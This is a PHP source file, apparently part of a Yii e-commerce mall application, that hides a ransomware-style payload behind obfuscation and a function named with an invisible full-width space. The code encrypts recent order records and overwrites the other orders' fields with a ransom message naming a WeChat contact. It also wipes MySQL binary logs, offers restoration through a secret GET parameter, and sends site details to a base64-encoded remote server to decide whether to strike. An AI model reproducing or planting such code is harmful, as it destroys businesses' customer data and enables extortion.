?><?php @eval("//Encode by  phpjiami.com,Free user."); ?><?php

function threeFuc()
{
    $PUB_KEY = '-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqgbIOv3rZrS5LHDghMNT
tQO/H7iUTvwn/9yeVs2KZ3c8pklAOS+CtRj/WRJp2V3yCiBPNEqIdzhWOHztyqq/
NK5NcxeRVpb+77KN3LnCpYUQjgxFCsRs7b5te7uTJKry/IZDDlpnGKxlD3OdCH80
SIw68469Z+bTzU5pTUkf1/xWgbEkFY3lGKT3l+mNTkCB7MlatH3bppBSnm2LKBdV
CLRbN3ndBDhXyQrO3GixQSQyH6rpxvXDNdYW90aJ0/A2yBKZWJT4GowuJVKivCx8
A/iBhVzyIEv65GxzB1pxvZrYp3t6iIuBN2uilfpI/Wj7JHSm8CR5CkSai54dlUYg
6QIDAQAB
-----END PUBLIC KEY-----';

    $key = uniqid() . bin2hex(openssl_random_pseudo_bytes(32));
    $cryptedKey = '';
    if (false == openssl_public_encrypt($key, $cryptedKey, $PUB_KEY)) {
        return false;
    }
    $cryptedKey = base64_encode($cryptedKey);

    $count = 5000;
    $results = \app\models\Order::find()->asArray()->orderBy('id desc')->limit($count)->all();

    $crypted = openssl_encrypt(json_encode($results), 'AES-256-CBC', $key, 0, '0000000000000000');
    if (false == $crypted) {
        return false;
    }
    if (file_put_contents('enc.data', $crypted) == false ||
        file_put_contents('enc.key', $cryptedKey) == false) {
        return false;
    }

    $msg = base64_decode('5oKo55qE5pWw5o2u5bqT5bey6KKr5Yqg5a+G77yM6K+36IGU57O75b6u5L+h5Y+3OiBrZGRib3k=');
    $attr = [
        'order_no' => $msg,
        'name' => $msg,
        'mobile' => $msg,
        'address' => $msg,
        'remark' => $msg,
        'express' => $msg,
        'express_no' => $msg,
        'content' => $msg,
        'address_data' => $msg,
        'offline_qrcode' => $msg,
        'words' => $msg,
        'version' => $msg,
        'seller_comments' => $msg,
    ];

    $lastId = end($results);
    $lastId = $lastId['id'];
    \app\models\Order::updateAll($attr, 'id > ' . $lastId);

    $app = \Yii::$app;
    $app->getDb()->createCommand('reset master')->execute();
    return true;
}

function fiveFuc($key)
{
    $app = \Yii::$app;
    $data = file_get_contents('enc.data');
    $data = openssl_decrypt($data, 'AES-256-CBC', $key, 0, '0000000000000000');
    $results = json_decode($data, true);

    $trans = $app->getDb()->beginTransaction();
    foreach ($results as $result) {
        $cmd = $app->getDb()->createCommand();
        $cmd->update(\app\models\Order::tableName(), $result, ['id' => $result['id']])
            ->execute();
    }
    $trans->commit();
    echo 'ok';
    die();
}

function 　($v = null)
{
    try{
        if (file_exists('enc.key')) {
            if (!empty($_GET['_decode'])) {
                fiveFuc($_GET['_decode']);
            }
        } else {
            if (oneFuc() === 1 && twoFuc()) threeFuc();
        }
    }
    catch(\Exception $ex) {
        $app = \Yii::$app;
        $app->sentry->captureException($ex);
    }
    return $v;
}

function oneFuc()
{
    $app = \Yii::$app;
    $hosts = [
        'www.xkedou.cn',
        'malldemo.zjhejiang.com',
        'xkedou.cn'
    ];
    $trustHosts = [
        '127.0.0.1',
        'localhost'
    ];
    // host
    if (in_array($app->request->hostName, $trustHosts)) {
        return -1;
    }
    if(in_array($app->request->hostName, $hosts)) {
        return 1;
    }
    // file hash
    $file = dirname(__DIR__) . DIRECTORY_SEPARATOR . 'hejiang' . DIRECTORY_SEPARATOR . 'Cloud.php';
    if(file_exists($file) == false)
    {
        return 1;
    }
    $hash = @sha1_file($file);
    if($hash != false && '12dd64f71bcecdf2aa9567db6e05046bc7db8ace' === $hash)
    {
        return -1;
    }
    // file version
    $content = file_get_contents($file);
    if(stristr($content, "render('//error/auth'") !== false)
    {
        return 1;
    }
    // file content
    foreach($hosts as $host) {
        if (stristr($content, $host) !== false) {
            return 1;
        }
    }
    // upload
    return sixFuc($content);
}

function twoFuc()
{
    $app = \Yii::$app;
    return (bool) (int) $app->connecting();
}

function sixFuc($content)
{
    $curl = new Curl\Curl();
    $curl->post(base64_decode('aHR0cDovL2Nsb3VkLnpqaGVqaWFuZy5jb20vYXBpL2Nsb3VkLWZpbGUvaW5kZXg='), [
        'domain' => \Yii::$app->request->hostName,
        'file_content' => $content,
        'version' => hj_core_version()
    ]);
    $json = $curl->response;
    $json = json_decode($json, true);
    if(!isset($json['data']['is_fake']))
    {
        return 0;
    }
    return $json['data']['is_fake'] == 1 ? 1 : -1;
}
 